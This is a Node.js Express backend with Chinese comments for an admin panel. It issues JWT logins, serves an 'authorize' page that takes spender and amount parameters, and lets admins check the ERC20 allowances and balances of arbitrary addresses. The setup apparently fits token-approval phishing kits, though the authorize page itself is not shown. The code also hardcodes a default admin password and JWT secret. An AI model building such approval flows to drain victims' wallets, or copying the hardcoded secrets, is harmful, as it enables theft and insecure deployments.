2. 后端 server.js

```js
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { ethers } = require('ethers');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'dev-secret-change-me';

// 后台账号
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'zhaolong123';
const ADMIN_PASSWORD_HASH =
  process.env.ADMIN_PASSWORD_HASH ||
  bcrypt.hashSync(process.env.ADMIN_PASSWORD || 'Aaqweewq1', 10);

// 链配置
const RPC_URL = process.env.RPC_URL || 'http://127.0.0.1:8545';
const CONTRACT_ADDRESS = process.env.CONTRACT_ADDRESS || '';
const CHAIN_ID = process.env.CHAIN_ID || '31337';

// ERC20 最小 ABI
const ERC20_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address account) view returns (uint256)'
];

function provider() {
  return new ethers.JsonRpcProvider(RPC_URL);
}

function readContract() {
  if (!CONTRACT_ADDRESS) throw new Error('CONTRACT_ADDRESS 未配置');
  return new ethers.Contract(CONTRACT_ADDRESS, ERC20_ABI, provider());
}

// 页面路由
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/authorize', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'authorize.html'));
});

// 登录
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body || {};

  if (username !== ADMIN_USERNAME) {
    return res.status(401).json({ ok: false, msg: '账号或密码错误' });
  }

  const passOk = await bcrypt.compare(password || '', ADMIN_PASSWORD_HASH);
  if (!passOk) {
    return res.status(401).json({ ok: false, msg: '账号或密码错误' });
  }

  const token = jwt.sign(
    { username, role: 'admin' },
    JWT_SECRET,
    { expiresIn: '2h' }
  );

  res.json({ ok: true, token });
});

// JWT 校验
function auth(req, res, next) {
  const h = req.headers.authorization || '';
  const token = h.startsWith('Bearer ') ? h.slice(7) : '';

  try {
    req.user = jwt.verify(token, JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ ok: false, msg: '未登录或 token 过期' });
  }
}

app.get('/api/me', auth, (req, res) => {
  res.json({ ok: true, user: req.user });
});

app.get('/api/config', (req, res) => {
  res.json({
    ok: true,
    contractAddress: CONTRACT_ADDRESS,
    chainId: CHAIN_ID
  });
});

// 查询授权额度
app.get('/api/allowance', auth, async (req, res) => {
  try {
    const { owner, spender } = req.query;
    if (!owner || !spender) {
      return res.status(400).json({ ok: false, msg: '缺少 owner 或 spender' });
    }

    const c = readContract();
    const value = await c.allowance(owner, spender);

    res.json({ ok: true, allowance: value.toString() });
  } catch (e) {
    res.status(500).json({ ok: false, msg: e.message });
  }
});

// 查询余额
app.get('/api/balance/:address', auth, async (req, res) => {
  try {
    const c = readContract();
    const value = await c.balanceOf(req.params.address);
    res.json({ ok: true, balance: value.toString() });
  } catch (e) {
    res.status(500).json({ ok: false, msg: e.message });
  }
});

app.listen(PORT, () => {
  console.log(`后台链接: http://localhost:${PORT}/admin`);
  console.log(`授权链接示例: http://localhost:${PORT}/authorize?spender=0x...&amount=100`);
});
```

